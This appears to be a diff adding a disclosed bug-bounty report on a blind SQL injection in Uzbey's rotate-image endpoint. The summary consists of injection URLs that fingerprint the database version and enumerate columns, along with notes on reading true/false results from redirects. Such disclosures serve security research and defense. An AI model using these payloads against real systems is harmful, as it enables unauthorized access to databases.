@@ -1,0 +1,21 @@
+ReportLink:https://hackerone.com/reports/23014
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/yappare
+ReportedTo:Uzbey(uzbey)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:02.11.2014 19:39:08
+
+Summary:
+
+https://staging.uzbey.com/rotate-image?fid=2841+and+substring(version(),1,1)=4 FALSE
+https://staging.uzbey.com/rotate-image?fid=2841+and+substring(version(),1,1)=5 TRUE
+
+https://staging.uzbey.com/rotate-image?fid=2841+and+1=1+order+by+1-- TRUE
+https://staging.uzbey.com/rotate-image?fid=2841+and+1=1+order+by+2-- FALSE
+
+FALSE = will redirect to access denied
+TRUE = redirected to page not found
+
+fid must be a valid image id
